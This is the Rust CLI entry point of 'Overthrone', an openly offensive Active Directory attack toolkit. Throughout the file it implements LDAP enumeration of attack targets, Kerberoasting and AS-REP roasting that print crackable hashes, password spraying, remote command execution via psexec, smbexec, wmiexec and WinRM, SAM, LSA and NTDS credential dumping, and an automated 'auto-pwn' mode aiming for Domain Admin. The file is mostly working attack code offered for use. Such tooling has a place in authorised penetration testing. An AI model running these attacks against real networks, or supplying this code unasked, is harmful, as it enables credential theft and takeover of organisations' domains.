//! Overthrone CLI — Active Directory Offensive Toolkit

mod auth;
mod autopwn;
mod banner;

use auth::{AuthMethod, Credentials};
use autopwn::ExecMethod;
use clap::{Parser, Subcommand};
use colored::Colorize;
use overthrone_core::proto::{kerberos, ldap, smb::SmbSession};
use overthrone_pilot::executor::execute_step;
use overthrone_pilot::goals::EngagementState;
use overthrone_pilot::planner::{PlannedAction, PlanStep};
use tracing_subscriber::{fmt, EnvFilter};

// ═══════════════════════════════════════════════════════
// CLI Definition
// ═══════════════════════════════════════════════════════

#[derive(Parser)]
#[command(name = "overthrone", version, about = "Active Directory Offensive Toolkit",
    long_about = "Overthrone — AD enumeration, attack path analysis, and exploitation framework.\nBuilt in Rust for speed and stealth.")]
struct Cli {
    #[command(subcommand)]
    command: Commands,

    #[arg(short = 'H', long, global = true, env = "OT_DC_HOST")]
    dc_host: Option<String>,

    #[arg(short, long, global = true, env = "OT_DOMAIN")]
    domain: Option<String>,

    #[arg(short, long, global = true, env = "OT_USERNAME")]
    username: Option<String>,

    #[arg(short, long, global = true, env = "OT_PASSWORD", hide_env_values = true)]
    password: Option<String>,

    #[arg(long, global = true, env = "OT_NTHASH", hide_env_values = true)]
    nt_hash: Option<String>,

    #[arg(long, global = true, env = "KRB5CCNAME")]
    ticket: Option<String>,

    #[arg(short = 'A', long, global = true, value_enum, default_value = "password")]
    auth_method: AuthMethod,

    #[arg(short, long, global = true, action = clap::ArgAction::Count)]
    verbose: u8,

    #[arg(short, long, global = true, value_enum, default_value = "text")]
    output: OutputFormat,

    #[arg(short = 'O', long, global = true)]
    outfile: Option<String>,
}

#[derive(Clone, clap::ValueEnum)]
enum OutputFormat {
    Text,
    Json,
    Csv,
}

#[derive(Subcommand)]
enum Commands {
    Enum {
        #[arg(value_enum)]
        target: EnumTarget,
        #[arg(long)]
        filter: Option<String>,
        #[arg(long, default_value = "false")]
        include_disabled: bool,
    },
    Kerberos {
        #[command(subcommand)]
        action: KerberosAction,
    },
    Smb {
        #[command(subcommand)]
        action: SmbAction,
    },
    Exec {
        #[arg(short, long, value_enum, default_value = "auto")]
        method: ExecMethod,
        #[arg(short, long)]
        target: String,
        #[arg(short, long)]
        command: String,
    },
    Graph {
        #[command(subcommand)]
        action: GraphAction,
    },
    Spray {
        #[arg(short, long)]
        password: String,
        #[arg(short, long)]
        userlist: String,
        #[arg(long, default_value = "1")]
        delay: u64,
        #[arg(long, default_value = "0")]
        jitter: u64,
    },
    #[command(name = "auto-pwn")]
    AutoPwn {
        #[arg(short, long, default_value = "Domain Admins")]
        target: String,
        #[arg(short, long, value_enum, default_value = "auto")]
        method: ExecMethod,
        #[arg(long, default_value = "false")]
        stealth: bool,
        #[arg(long, default_value = "false")]
        dry_run: bool,
    },
    Dump {
        #[arg(short, long)]
        target: String,
        #[arg(value_enum)]
        source: DumpSource,
    },
}

#[derive(Clone, clap::ValueEnum)]
enum EnumTarget {
    Users,
    Computers,
    Groups,
    Trusts,
    Spns,
    Asrep,
    Delegations,
    Gpos,
    All,
}

#[derive(Subcommand)]
enum KerberosAction {
    Roast {
        #[arg(long)]
        spn: Option<String>,
    },
    AsrepRoast,
    GetTgt,
    GetTgs {
        #[arg(long)]
        spn: String,
    },
}

#[derive(Subcommand)]
enum SmbAction {
    Shares {
        #[arg(short, long)]
        target: String,
    },
    Admin {
        #[arg(short, long)]
        targets: String,
    },
    Spider {
        #[arg(short, long)]
        target: String,
        #[arg(long, default_value = ".kdbx,.key,.pem,.config,.ps1,.rdp")]
        extensions: String,
    },
    Get {
        #[arg(short, long)]
        target: String,
        #[arg(short, long)]
        path: String,
    },
    Put {
        #[arg(short, long)]
        target: String,
        #[arg(short, long)]
        local: String,
        #[arg(short, long)]
        remote: String,
    },
}

#[derive(Subcommand)]
enum GraphAction {
    Build,
    Path {
        #[arg(short, long)]
        from: String,
        #[arg(short, long)]
        to: String,
    },
    PathToDa {
        #[arg(short, long)]
        from: String,
    },
    Stats,
    Export {
        #[arg(short, long, default_value = "graph.json")]
        output: String,
    },
}

#[derive(Clone, clap::ValueEnum)]
enum DumpSource {
    Sam,
    Lsa,
    Ntds,
    Dcc2,
}

// ═══════════════════════════════════════════════════════
// Main
// ═══════════════════════════════════════════════════════

#[tokio::main]
async fn main() {
    let cli = Cli::parse();

    let filter = match cli.verbose {
        0 => "warn",
        1 => "info",
        2 => "debug",
        _ => "trace",
    };
    fmt()
        .with_env_filter(
            EnvFilter::try_from_default_env().unwrap_or_else(|_| EnvFilter::new(filter)),
        )
        .with_target(false)
        .compact()
        .init();

    banner::print_banner();

    let exit_code = match &cli.command {
        Commands::Enum {
            target,
            filter,
            include_disabled,
        } => cmd_enum(&cli, target.clone(), filter.clone(), *include_disabled).await,
        Commands::Kerberos { action } => cmd_kerberos(&cli, action).await,
        Commands::Smb { action } => cmd_smb(&cli, action).await,
        Commands::Exec {
            method,
            target,
            command,
        } => cmd_exec(&cli, method.clone(), target, command).await,
        Commands::Graph { action } => cmd_graph(action).await,
        Commands::Spray {
            password,
            userlist,
            delay,
            jitter,
        } => cmd_spray(&cli, password, userlist, *delay, *jitter).await,
        Commands::AutoPwn {
            target,
            method,
            stealth,
            dry_run,
        } => cmd_autopwn(&cli, target, method.clone(), *stealth, *dry_run).await,
        Commands::Dump { target, source } => cmd_dump(&cli, target, source.clone()).await,
    };

    std::process::exit(exit_code);
}

// ═══════════════════════════════════════════════════════
// Credential / DC helpers
// ═══════════════════════════════════════════════════════

fn require_creds(cli: &Cli) -> Result<Credentials, i32> {
    let domain = cli.domain.as_deref().unwrap_or_else(|| {
        banner::print_fail("--domain is required");
        std::process::exit(1)
    });
    let username = cli.username.as_deref().unwrap_or_else(|| {
        banner::print_fail("--username is required");
        std::process::exit(1)
    });
    Credentials::from_args(
        domain,
        username,
        cli.password.as_deref(),
        cli.nt_hash.as_deref(),
        cli.ticket.as_deref(),
        Some(cli.auth_method.clone()),
    )
    .map_err(|e| {
        banner::print_fail(&format!("Auth error: {}", e));
        1
    })
}

fn require_dc(cli: &Cli) -> Result<String, i32> {
    cli.dc_host.clone().ok_or_else(|| {
        banner::print_fail("--dc-host is required");
        1
    })
}

// ═══════════════════════════════════════════════════════
// ENUM — wired to overthrone_core::proto::ldap
// ═══════════════════════════════════════════════════════

async fn cmd_enum(
    cli: &Cli,
    target: EnumTarget,
    _filter: Option<String>,
    _include_disabled: bool,
) -> i32 {
    banner::print_module_banner("Enumeration");
    let creds = match require_creds(cli) {
        Ok(c) => c,
        Err(e) => return e,
    };
    let dc = match require_dc(cli) {
        Ok(h) => h,
        Err(e) => return e,
    };
    let (secret, _use_hash) = match creds.secret_and_hash_flag() {
        Ok(v) => v,
        Err(e) => {
            banner::print_fail(&e);
            return 1;
        }
    };

    let mut conn =
        match ldap::LdapSession::connect(&dc, &creds.domain, &creds.username, &secret, false)
            .await
        {
            Ok(c) => c,
            Err(e) => {
                banner::print_fail(&format!("LDAP connect failed: {}", e));
                return 1;
            }
        };

    // ── Users ──
    match target {
        EnumTarget::Users | EnumTarget::All => {
            banner::print_info("Enumerating users...");
            match conn.enumerate_users().await {
                Ok(users) => {
                    let kerberoastable = users
                        .iter()
                        .filter(|u| !u.service_principal_names.is_empty())
                        .count();
                    let asrep = users.iter().filter(|u| u.dont_req_preauth).count();
                    let admins = users.iter().filter(|u| u.admin_count).count();
                    banner::print_success(&format!(
                        "Found {} users ({} admin, {} kerberoastable, {} AS-REP)",
                        users.len(),
                        admins,
                        kerberoastable,
                        asrep
                    ));
                    println!();
                    println!(
                        "  {:<25} {:<8} {:<6} {:<6} {}",
                        "sAMAccountName".bold(),
                        "Enabled".bold(),
                        "Admin".bold(),
                        "SPN".bold(),
                        "Description".bold()
                    );
                    println!("  {}", "─".repeat(80));
                    for u in &users {
                        println!(
                            "  {:<25} {:<8} {:<6} {:<6} {}",
                            u.sam_account_name,
                            if u.enabled { "✓".green() } else { "✗".red() },
                            if u.admin_count {
                                "★".yellow()
                            } else {
                                "-".dimmed()
                            },
                            if !u.service_principal_names.is_empty() {
                                "SPN".cyan()
                            } else {
                                "-".dimmed()
                            },
                            u.description.as_deref().unwrap_or("").dimmed(),
                        );
                    }
                }
                Err(e) => {
                    banner::print_fail(&format!("User enumeration failed: {}", e));
                }
            }
        }
        _ => {}
    }

    // ── Computers ──
    match target {
        EnumTarget::Computers | EnumTarget::All => {
            banner::print_info("Enumerating computers...");
            match conn.enumerate_computers().await {
                Ok(computers) => {
                    let dcs = computers
                        .iter()
                        .filter(|c| c.user_account_control & 0x2000 != 0)
                        .count();
                    banner::print_success(&format!(
                        "Found {} computers ({} DCs)",
                        computers.len(),
                        dcs
                    ));
                    println!();
                    for c in &computers {
                        let tag = if c.user_account_control & 0x2000 != 0 {
                            " [DC]".yellow()
                        } else if c.unconstrained_delegation {
                            " [UNCONSTRAINED]".red()
                        } else {
                            "".normal()
                        };
                        println!(
                            "  {} {}{}",
                            c.sam_account_name.bold(),
                            c.dns_hostname.as_deref().unwrap_or("?").dimmed(),
                            tag,
                        );
                    }
                }
                Err(e) => {
                    banner::print_fail(&format!("Computer enumeration failed: {}", e));
                }
            }
        }
        _ => {}
    }

    // ── Groups ──
    match target {
        EnumTarget::Groups | EnumTarget::All => {
            banner::print_info("Enumerating groups...");
            match conn.enumerate_groups().await {
                Ok(groups) => {
                    banner::print_success(&format!("Found {} groups", groups.len()));
                    for g in &groups {
                        println!(
                            "  {} ({} members)",
                            g.sam_account_name.bold(),
                            g.members.len()
                        );
                    }
                }
                Err(e) => {
                    banner::print_fail(&format!("Group enumeration failed: {}", e));
                }
            }
        }
        _ => {}
    }

    // ── Trusts ──
    match target {
        EnumTarget::Trusts | EnumTarget::All => {
            banner::print_info("Enumerating trusts...");
            match conn.enumerate_trusts().await {
                Ok(trusts) => {
                    banner::print_success(&format!("Found {} domain trusts", trusts.len()));
                    for t in &trusts {
                        println!(
                            "  {} ({}, {})",
                            t.trust_partner.bold(),
                            t.trust_direction,
                            t.trust_type
                        );
                    }
                }
                Err(e) => {
                    banner::print_fail(&format!("Trust enumeration failed: {}", e));
                }
            }
        }
        _ => {}
    }

    // ── SPNs ──
    if matches!(target, EnumTarget::Spns) {
        banner::print_info("Enumerating kerberoastable SPNs...");
        match conn.enumerate_users().await {
            Ok(users) => {
                let spn_users: Vec<_> = users
                    .iter()
                    .filter(|u| !u.service_principal_names.is_empty())
                    .collect();
                banner::print_success(&format!(
                    "Found {} kerberoastable accounts",
                    spn_users.len()
                ));
                for u in spn_users {
                    println!(
                        "  {} → {:?}",
                        u.sam_account_name.bold(),
                        u.service_principal_names
                    );
                }
            }
            Err(e) => {
                banner::print_fail(&format!("{}", e));
            }
        }
    }

    // ── AS-REP ──
    if matches!(target, EnumTarget::Asrep) {
        banner::print_info("Enumerating AS-REP roastable accounts...");
        match conn.enumerate_users().await {
            Ok(users) => {
                let asrep: Vec<_> = users.iter().filter(|u| u.dont_req_preauth).collect();
                banner::print_success(&format!(
                    "Found {} AS-REP roastable accounts",
                    asrep.len()
                ));
                for u in asrep {
                    println!("  {}", u.sam_account_name.bold().red());
                }
            }
            Err(e) => {
                banner::print_fail(&format!("{}", e));
            }
        }
    }

    // ── Delegations ──
    if matches!(target, EnumTarget::Delegations) {
        banner::print_info("Enumerating delegation configurations...");
        match conn.enumerate_computers().await {
            Ok(computers) => {
                let unconstrained: Vec<_> = computers
                    .iter()
                    .filter(|c| {
                        c.unconstrained_delegation && c.user_account_control & 0x2000 == 0
                    })
                    .collect();
                banner::print_success(&format!(
                    "Found {} unconstrained delegation hosts (non-DC)",
                    unconstrained.len()
                ));
                for c in unconstrained {
                    println!(
                        "  {} [UNCONSTRAINED]",
                        c.dns_hostname
                            .as_deref()
                            .unwrap_or(&c.sam_account_name)
                            .bold()
                            .red()
                    );
                }
            }
            Err(e) => {
                banner::print_fail(&format!("{}", e));
            }
        }
    }

    // ── GPOs ──
    if matches!(target, EnumTarget::Gpos) {
        banner::print_info("Enumerating GPOs...");
        let filter_str = "(objectClass=groupPolicyContainer)";
        let attrs: &[&str] = &["displayName", "gPCFileSysPath"];
        match conn.custom_search(filter_str, attrs).await {
            Ok(entries) => {
                banner::print_success(&format!("Found {} GPOs", entries.len()));
                for e in entries {
                    let name = e
                        .attrs
                        .get("displayName")
                        .and_then(|v| v.first())
                        .map(|s| s.as_str())
                        .unwrap_or("?");
                    let path = e
                        .attrs
                        .get("gPCFileSysPath")
                        .and_then(|v| v.first())
                        .map(|s| s.as_str())
                        .unwrap_or("");
                    println!("  {} → {}", name.bold(), path.dimmed());
                }
            }
            Err(e) => {
                banner::print_fail(&format!("GPO enum failed: {}", e));
            }
        }
    }

    let _ = conn.disconnect().await;
    0
}

// ═══════════════════════════════════════════════════════
// KERBEROS — wired to overthrone_core::proto::kerberos
// ═══════════════════════════════════════════════════════

async fn cmd_kerberos(cli: &Cli, action: &KerberosAction) -> i32 {
    banner::print_module_banner("Kerberos");
    let creds = match require_creds(cli) {
        Ok(c) => c,
        Err(e) => return e,
    };
    let dc = match require_dc(cli) {
        Ok(h) => h,
        Err(e) => return e,
    };
    let (secret, use_hash) = match creds.secret_and_hash_flag() {
        Ok(v) => v,
        Err(e) => {
            banner::print_fail(&e);
            return 1;
        }
    };

    match action {
        KerberosAction::Roast { spn: _ } => {
            banner::print_info("Requesting TGT...");
            let tgt = match kerberos::request_tgt(
                &dc,
                &creds.domain,
                &creds.username,
                &secret,
                use_hash,
            )
            .await
            {
                Ok(t) => {
                    banner::print_success("TGT obtained");
                    t
                }
                Err(e) => {
                    banner::print_fail(&format!("TGT failed: {}", e));
                    return 1;
                }
            };

            banner::print_info("Enumerating kerberoastable accounts via LDAP...");
            let mut conn = match ldap::LdapSession::connect(
                &dc,
                &creds.domain,
                &creds.username,
                &secret,
                false,
            )
            .await
            {
                Ok(c) => c,
                Err(e) => {
                    banner::print_fail(&format!("LDAP: {}", e));
                    return 1;
                }
            };
            let users = conn.enumerate_users().await.unwrap_or_default();
            let _ = conn.disconnect().await;

            let targets: Vec<String> = users
                .iter()
                .filter(|u| {
                    !u.service_principal_names.is_empty()
                        && u.sam_account_name.to_lowercase() != "krbtgt"
                        && !u.sam_account_name.ends_with('$')
                })
                .map(|u| u.sam_account_name.clone())
                .collect();

            banner::print_info(&format!("Kerberoasting {} accounts...", targets.len()));
            let mut hash_count = 0;
            for account in &targets {
                let target_spn = format!("placeholder/{}", account);
                match kerberos::kerberoast(&dc, &tgt, &target_spn).await {
                    Ok(hash) => {
                        banner::print_success(&format!("Hash for {}", account));
                        println!("    {}", hash.hash_string.dimmed());
                        hash_count += 1;
                    }
                    Err(e) => {
                        banner::print_fail(&format!("{}: {}", account, e));
                    }
                }
            }
            banner::print_success(&format!(
                "Kerberoast complete: {}/{} hashes",
                hash_count,
                targets.len()
            ));
        }
        KerberosAction::AsrepRoast => {
            banner::print_info("Enumerating AS-REP roastable accounts...");
            let mut conn = match ldap::LdapSession::connect(
                &dc,
                &creds.domain,
                &creds.username,
                &secret,
                false,
            )
            .await
            {
                Ok(c) => c,
                Err(e) => {
                    banner::print_fail(&format!("LDAP: {}", e));
                    return 1;
                }
            };
            let users = conn.enumerate_users().await.unwrap_or_default();
            let _ = conn.disconnect().await;

            let targets: Vec<String> = users
                .iter()
                .filter(|u| u.dont_req_preauth)
                .map(|u| u.sam_account_name.clone())
                .collect();

            banner::print_info(&format!("AS-REP Roasting {} accounts...", targets.len()));
            for user in &targets {
                match kerberos::asrep_roast(&dc, &creds.domain, user).await {
                    Ok(hash) => {
                        banner::print_success(&format!("Hash for {}", user));
                        println!("    {}", hash.hash_string.dimmed());
                    }
                    Err(e) => {
                        banner::print_fail(&format!("{}: {}", user, e));
                    }
                }
            }
        }
        KerberosAction::GetTgt => {
            banner::print_info("Requesting TGT...");
            match kerberos::request_tgt(&dc, &creds.domain, &creds.username, &secret, use_hash)
                .await
            {
                Ok(_tgt) => {
                    banner::print_success(&format!(
                        "TGT for {}\\{} obtained",
                        creds.domain, creds.username
                    ));
                }
                Err(e) => {
                    banner::print_fail(&format!("TGT failed: {}", e));
                    return 1;
                }
            }
        }
        KerberosAction::GetTgs { spn } => {
            banner::print_info(&format!("Requesting TGT then TGS for {}...", spn));
            let tgt = match kerberos::request_tgt(
                &dc,
                &creds.domain,
                &creds.username,
                &secret,
                use_hash,
            )
            .await
            {
                Ok(t) => t,
                Err(e) => {
                    banner::print_fail(&format!("TGT: {}", e));
                    return 1;
                }
            };
            match kerberos::kerberoast(&dc, &tgt, spn).await {
                Ok(hash) => {
                    banner::print_success(&format!("TGS for {}", spn));
                    println!("    {}", hash.hash_string.dimmed());
                }
                Err(e) => {
                    banner::print_fail(&format!("TGS failed: {}", e));
                    return 1;
                }
            }
        }
    }
    0
}

// ═══════════════════════════════════════════════════════
// SMB — wired to overthrone_core::proto::smb
// ═══════════════════════════════════════════════════════

async fn cmd_smb(cli: &Cli, action: &SmbAction) -> i32 {
    banner::print_module_banner("SMB");
    let creds = match require_creds(cli) {
        Ok(c) => c,
        Err(e) => return e,
    };
    let (secret, _use_hash) = match creds.secret_and_hash_flag() {
        Ok(v) => v,
        Err(e) => {
            banner::print_fail(&e);
            return 1;
        }
    };

    match action {
        SmbAction::Shares { target } => {
            banner::print_info(&format!("Enumerating shares on {}...", target));
            match SmbSession::connect(target, &creds.domain, &creds.username, &secret).await {
                Ok(smb) => {
                    let shares = smb
                        .check_share_access(&["C$", "ADMIN$", "IPC$", "SYSVOL", "NETLOGON"])
                        .await;
                    let readable: Vec<_> = shares.iter().filter(|s| s.readable).collect();
                    banner::print_success(&format!("{} readable shares", readable.len()));
                    for s in &shares {
                        let access = if s.readable {
                            "READ".green()
                        } else {
                            "DENIED".red()
                        };
                        println!("  {:<15} {}", s.share_name, access);
                    }
                }
                Err(e) => {
                    banner::print_fail(&format!("SMB connect: {}", e));
                    return 1;
                }
            }
        }
        SmbAction::Admin { targets } => {
            banner::print_info(&format!("Checking admin access on {}...", targets));
            let target_list: Vec<&str> = targets.split(',').map(|s| s.trim()).collect();
            for target in target_list {
                match SmbSession::connect(target, &creds.domain, &creds.username, &secret).await {
                    Ok(smb) => {
                        let result = smb.check_admin_access().await;
                        if result.has_admin {
                            banner::print_success(&format!("Admin on {}", target));
                        } else {
                            banner::print_fail(&format!("No admin on {}", target));
                        }
                    }
                    Err(e) => {
                        banner::print_fail(&format!("{}: {}", target, e));
                    }
                }
            }
        }
        SmbAction::Spider {
            target,
            extensions,
        } => {
            banner::print_info(&format!("Spidering {} for {}...", target, extensions));
            banner::print_warn("Share spider not yet implemented — use smbclient or manspider");
        }
        SmbAction::Get { target, path } => {
            banner::print_info(&format!("Reading {}:{}", target, path));
            match SmbSession::connect(target, &creds.domain, &creds.username, &secret).await {
                Ok(smb) => {
                    let parts: Vec<&str> = path.splitn(2, '\\').collect();
                    let (share, file_path) = if parts.len() == 2 {
                        (parts[0], parts[1])
                    } else {
                        (path.as_str(), "")
                    };
                    match smb.read_file(share, file_path).await {
                        Ok(data) => {
                            banner::print_success(&format!("{} bytes read", data.len()));
                            println!("{}", String::from_utf8_lossy(&data));
                        }
                        Err(e) => {
                            banner::print_fail(&format!("Read failed: {}", e));
                        }
                    }
                }
                Err(e) => {
                    banner::print_fail(&format!("SMB: {}", e));
                    return 1;
                }
            }
        }
        SmbAction::Put {
            target,
            local,
            remote,
        } => {
            banner::print_info(&format!("Uploading {} → {}:{}", local, target, remote));
            banner::print_warn("File upload not yet wired — coming soon");
        }
    }
    0
}

// ═══════════════════════════════════════════════════════
// EXEC — wired to overthrone-pilot executor
// ═══════════════════════════════════════════════════════

async fn cmd_exec(cli: &Cli, method: ExecMethod, target: &str, command: &str) -> i32 {
    banner::print_module_banner("Remote Execution");
    let creds = match require_creds(cli) {
        Ok(c) => c,
        Err(e) => return e,
    };
    let dc = match require_dc(cli) {
        Ok(h) => h,
        Err(e) => return e,
    };

    let ctx = match creds.to_exec_context(&dc, false, false) {
        Ok(c) => c,
        Err(e) => {
            banner::print_fail(&e);
            return 1;
        }
    };

    let exec_method = match method {
        ExecMethod::SmbExec => "smbexec",
        ExecMethod::PsExec => "psexec",
        ExecMethod::WmiExec => "wmiexec",
        ExecMethod::WinRm => "winrm",
        ExecMethod::Auto => "smbexec",
    };

    banner::print_info(&format!("{} → {} via {}", target, command, exec_method));

    let mut state = EngagementState::default();
    let step = PlanStep {
        id: "exec-01".into(),
        description: format!("Execute '{}' on {}", command, target),
        stage: overthrone_pilot::runner::Stage::Lateral,
        action: PlannedAction::ExecCommand {
            target: target.to_string(),
            command: command.to_string(),
            method: exec_method.to_string(),
        },
        priority: 100,
        noise: overthrone_pilot::planner::NoiseLevel::Medium,
        depends_on: vec![],
        executed: false,
        result: None,
        retries: 0,
        max_retries: 2,
    };

    let result = execute_step(&step, &ctx, &mut state).await;
    if result.success {
        banner::print_success("Command executed");
        println!("{}", result.output);
    } else {
        banner::print_fail(&result.output);
        return 1;
    }
    0
}

// ═══════════════════════════════════════════════════════
// SPRAY — wired to kerberos pre-auth
// ═══════════════════════════════════════════════════════

async fn cmd_spray(cli: &Cli, password: &str, userlist: &str, delay: u64, _jitter: u64) -> i32 {
    banner::print_module_banner("Password Spray");
    let creds = match require_creds(cli) {
        Ok(c) => c,
        Err(e) => return e,
    };
    let dc = match require_dc(cli) {
        Ok(h) => h,
        Err(e) => return e,
    };

    let users = match std::fs::read_to_string(userlist) {
        Ok(data) => data
            .lines()
            .map(|l| l.trim().to_string())
            .filter(|l| !l.is_empty())
            .collect::<Vec<_>>(),
        Err(e) => {
            banner::print_fail(&format!("Can't read {}: {}", userlist, e));
            return 1;
        }
    };

    banner::print_info(&format!(
        "Spraying {} users with password (delay {}s)",
        users.len(),
        delay
    ));
    let mut valid_count = 0;

    for user in &users {
        match kerberos::request_tgt(&dc, &creds.domain, user, password, false).await {
            Ok(_) => {
                banner::print_success(&format!("VALID  {}:{}", user, password));
                valid_count += 1;
            }
            Err(_) => {
                println!(
                    "  {} {}:{}",
                    "[-]".dimmed(),
                    user.dimmed(),
                    password.dimmed()
                );
            }
        }
        if delay > 0 {
            tokio::time::sleep(std::time::Duration::from_secs(delay)).await;
        }
    }

    banner::print_success(&format!(
        "Spray complete: {}/{} valid",
        valid_count,
        users.len()
    ));
    0
}

// ═══════════════════════════════════════════════════════
// AUTO-PWN — wired to autopwn module
// ═══════════════════════════════════════════════════════

async fn cmd_autopwn(
    cli: &Cli,
    target: &str,
    method: ExecMethod,
    stealth: bool,
    dry_run: bool,
) -> i32 {
    let creds = match require_creds(cli) {
        Ok(c) => c,
        Err(e) => return e,
    };
    let dc = match require_dc(cli) {
        Ok(h) => h,
        Err(e) => return e,
    };

    let config = autopwn::AutoPwnConfig {
        dchost: dc,
        creds,
        target: target.to_string(),
        stealth,
        dryrun: dry_run,
        exec_method: method,
    };

    let result = autopwn::run(config).await;
    if result.domain_admin_achieved {
        0
    } else {
        1
    }
}

// ═══════════════════════════════════════════════════════
// DUMP — wired to overthrone-pilot executor
// ═══════════════════════════════════════════════════════

async fn cmd_dump(cli: &Cli, target: &str, source: DumpSource) -> i32 {
    banner::print_module_banner("Credential Dump");
    let creds = match require_creds(cli) {
        Ok(c) => c,
        Err(e) => return e,
    };
    let dc = match require_dc(cli) {
        Ok(h) => h,
        Err(e) => return e,
    };

    let ctx = match creds.to_exec_context(&dc, false, false) {
        Ok(c) => c,
        Err(e) => {
            banner::print_fail(&e);
            return 1;
        }
    };

    let action = match source {
        DumpSource::Sam => PlannedAction::DumpSam {
            target: target.to_string(),
        },
        DumpSource::Lsa => PlannedAction::DumpLsa {
            target: target.to_string(),
        },
        DumpSource::Ntds => PlannedAction::DumpNtds {
            target: target.to_string(),
        },
        DumpSource::Dcc2 => PlannedAction::DumpDcc2 {
            target: target.to_string(),
        },
    };

    let source_name = match source {
        DumpSource::Sam => "SAM",
        DumpSource::Lsa => "LSA",
        DumpSource::Ntds => "NTDS",
        DumpSource::Dcc2 => "DCC2",
    };

    banner::print_info(&format!("Dumping {} from {}...", source_name, target));

    let mut state = EngagementState::default();
    let step = PlanStep {
        id: "dump-01".into(),
        description: format!("Dump {} from {}", source_name, target),
        stage: overthrone_pilot::runner::Stage::Loot,
        action,
        priority: 100,
        noise: overthrone_pilot::planner::NoiseLevel::High,
        depends_on: vec![],
        executed: false,
        result: None,
        retries: 0,
        max_retries: 1,
    };

    let result = execute_step(&step, &ctx, &mut state).await;
    if result.success {
        banner::print_success(&format!("{} dump complete", source_name));
        println!("{}", result.output);
        for cred in state.credentials.values() {
            println!("  {} → {}", cred.username.bold(), cred.secret.red());
        }
    } else {
        banner::print_fail(&result.output);
        return 1;
    }
    0
}

// ═══════════════════════════════════════════════════════
// GRAPH — placeholder (wire when module is ready)
// ═══════════════════════════════════════════════════════

async fn cmd_graph(action: &GraphAction) -> i32 {
    banner::print_module_banner("Attack Graph");
    match action {
        GraphAction::Build => banner::print_info("Building attack graph..."),
        GraphAction::Path { from, to } => {
            banner::print_info(&format!("Shortest path: {} → {}", from, to))
        }
        GraphAction::PathToDa { from } => {
            banner::print_info(&format!("Paths to DA from {}", from))
        }
        GraphAction::Stats => banner::print_info("Graph statistics"),
        GraphAction::Export { output } => {
            banner::print_info(&format!("Exporting to {}", output))
        }
    }
    banner::print_warn("Graph module not yet wired — use BloodHound/SharpHound in parallel");
    0
}
